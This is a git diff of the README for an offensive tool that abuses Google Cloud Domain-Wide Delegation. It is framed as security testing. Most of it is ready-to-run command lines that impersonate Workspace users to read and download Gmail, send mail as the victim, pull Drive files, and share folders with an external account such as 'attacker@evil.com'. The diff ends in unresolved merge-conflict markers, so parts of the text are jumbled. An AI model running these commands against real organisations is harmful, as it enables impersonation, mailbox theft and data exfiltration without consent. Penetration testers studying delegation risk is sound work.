@@ -5,199 +5,78 @@ Tool to perform GCP Domain Wide Delegation abuse and access Gmail, Drive and Cha
 
 <img src="./Images/DomainWideDelegation_GCP.png" alt="gcpdelegation" width="800"/>
 
-# 🔐 GCP Delegate Tool - Complete Cheatsheet
-
-> **Domain-Wide Delegation Abuse Tool for Security Testing**  
-> Version 3.0.0 | By @lutzenfried
-
----
-
-## 📋 Table of Contents
-
-- [Quick Start](#quick-start)
-- [Gmail Module](#-gmail-module)
-- [Drive Module](#-drive-module)
-- [Chat Module](#-chat-module)
-- [Common Scenarios](#-common-scenarios)
-
----
-
-## 🚀 Quick Start
-
-### Basic Syntax
-
-```bash
-python delegate.py -k <SERVICE_ACCOUNT_KEY> -i <EMAIL_TO_IMPERSONATE> -m <MODULE> -a <ACTION> [OPTIONS]
+## Delegate tool usage
+### Gmail usage
+List all Gmail emails (limit 200 emails)
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a list
 ```
 
-### Required Parameters
-
-| Parameter | Short | Description |
-|-----------|-------|-------------|
-| `--key` | `-k` | Service account key JSON file path |
-| `--impersonate` | `-i` | Email address to impersonate |
-| `--module` | `-m` | Module: `gmail`, `drive`, `chat` |
-| `--action` | `-a` | Action to perform (see module sections) |
-
----
-
-## 📧 Gmail Module
-
-### Available Actions
-
-| Action | Description | Required Parameters |
-|--------|-------------|-------------------|
-| `list` | List emails (subject + sender) | None |
-| `read` | Read full email contents | None |
-| `listFolders` | List all Gmail labels/folders | None |
-| `listFromLabel` | List emails from specific label | `--label` |
-| `readFromLabel` | Read emails from specific label | `--label` |
-| `send` | Send an email | `--recipient`, `--subject`, `--content` |
-| `downloadAttachments` | Download all attachments | None |
-
-### Commands
-
-#### List Emails
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m gmail -a list
+Read Gmail emails (limit 200 emails)
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a read
 ```
 
-#### Read Email Contents
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m gmail -a read
+List Gmail folders (Labels)
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a folders
 ```
 
-#### List Gmail Folders/Labels
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFolders
+Download all attachments within the targeted Gmail (limit 200 emails)
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a attachments
 ```
 
-#### List Emails from Specific Label
-```bash
-# INBOX
-python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFromLabel --label "INBOX"
-
-# SENT
-python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFromLabel --label "SENT"
-
-# IMPORTANT
-python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFromLabel --label "IMPORTANT"
+Read all emails within specified folder (Labels) (limit 200 emails)
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a read -f DRAFT
 ```
 
-#### Read Emails from Label
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m gmail -a readFromLabel --label "INBOX"
+Send an email as targeted.delegated@mackinsoncloud.com to jdoe@gmail.com specifying subject and body email content
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a send -r jdoe@gmail.com -s "Test Messaage subject" -c "Hello this is a test email"
 ```
 
-#### Send Email
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m gmail -a send \
-  --recipient "target@example.com" \
-  --subject "Important Update" \
-  --content "This is the email body text"
+### Drive usage
+
+List all files and folders within the targeted Drive account
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a list
 ```
 
-#### Download All Attachments
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m gmail -a downloadAttachments
+List all folders content within the targeted Drive account
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a folders
 ```
 
-### Gmail Label Examples
-
-Common Gmail labels:
-- `INBOX` - Inbox emails
-- `SENT` - Sent emails
-- `DRAFT` - Draft emails
-- `TRASH` - Trash
-- `SPAM` - Spam folder
-- `IMPORTANT` - Important emails
-- `STARRED` - Starred emails
-- `UNREAD` - Unread emails
-
----
-
-## 💾 Drive Module
-
-### Available Actions
-
-| Action | Description | Required Parameters |
-|--------|-------------|-------------------|
-| `listFiles` | List all files and folders | None |
-| `listFolders` | List folders with contents | None |
-| `download` | Download a specific file | `--filename` |
-| `upload` | Upload a file to Drive | `--filepath`, `--filename`, `[--foldername]` |
-| `modifyPermissions` | Share file with external account | `--filename`, `--external-account` |
-
-### Commands
-
-#### List All Files
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m drive -a listFiles
+Download locally a specific file secret.txt
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a download -t secret.txt
 ```
 
-#### List Folders with Contents
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m drive -a listFolders
+Upload files at user's Drive root folder (My Drive)
+```
+python3 delegate.py -k <serviceaccount_key> -m drive -a upload -i <targeted_Workspace_user> -t <localfile> -p <NameInDrive>
+python3 delegate.py -k ../sa_key.json -m drive -a upload -i targeted.delegated@mackinsoncloud.com -t test.txt -p uploadedTest.txt
 ```
 
-#### Download File
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m drive -a download \
-  --filename "Confidential_Report.xlsx"
+Upload files within specific user's Drive folder or organizational Shared Drive
+```
+python3 delegate.py -k <serviceaccount_key> -m drive -a upload -i <targeted_Workspace_user> -t <localfile> -p <NameInDrive> -f <DriveFolder>
+python3 delegate.py -k ../sa_key.json -m drive -a upload -i targeted.delegated@mackinsoncloud.com -t test.txt -p uploadedTest.txt -f Restricted_documents
 ```
 
-**Supported File Types:**
-- Google Sheets → Exports as `.xlsx`
-- Google Docs → Exports as `.docx`
-- Google Slides → Exports as `.pptx`
-- Binary files → Downloads as-is
-
-#### Upload File
-```bash
-# Upload to root
-python delegate.py -k sa_key.json -i victim@company.com -m drive -a upload \
-  --filepath "/path/to/local/file.pdf" \
-  --filename "uploaded_file.pdf"
-
-# Upload to specific folder
-python delegate.py -k sa_key.json -i victim@company.com -m drive -a upload \
-  --filepath "/path/to/local/file.pdf" \
-  --filename "uploaded_file.pdf" \
-  --foldername "Documents"
+Modify permissions on specific folder (Add external Gmail account with Writer permissions over the file/folder)
+```
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a permissions -t Restricted_documents -e attackeremail@gmail.com
 ```
 
-#### Share File with External Account
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m drive -a modifyPermissions \
-  --filename "Sensitive_Data.xlsx" \
-  --external-account "attacker@evil.com"
+Modify permissions on specific file (Add external Gmail account with Writer permissions over the file/folder)
 ```
-
-**Note:** This grants write access and sends a notification email.
-
----
-
-## 💬 Chat Module
-
-### Available Actions
-
-| Action | Description | Required Parameters |
-|--------|-------------|-------------------|
-| `listSpaces` | List all accessible Chat spaces | None |
-| `listMessages` | List messages in a space | `--space-id`, `[--max-results]` |
-| `readMessages` | Read full message content | `--space-id`, `[--max-results]` |
-| `sendMessage` | Send a message to space | `--space-id`, `--text`, `[--thread-id]` |
-| `sendWithAttachment` | Send message with file | `--space-id`, `--text`, `--filepath`, `[--thread-id]` |
-| `downloadAttachments` | Download all attachments | `--space-id`, `[--max-results]` |
-| `getMembers` | List space members | `--space-id` |
-| `createSpace` | Create a new Chat space | `--summary`, `[--description]`, `[--threaded]` |
-
-### Commands
-
-#### List All Chat Spaces
-```bash
-python delegate.py -k sa_key.json -i victim@company.com -m chat -a listSpaces
+python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a permissions -t secrets.txt -e attackeremail@gmail.com
 ```
+<<<<<<< HEAD
+=======
 
 #### List Messages in Space
 ```bash
@@ -417,3 +296,4 @@ Unauthorized access to computer systems is illegal under:
 ---
 
 **Version 3.0.0** | Last Updated: 2025-10-16 | Author: @lutzenfried
+>>>>>>> d17f22b05718048d79438fb720ca7dddb749cd66
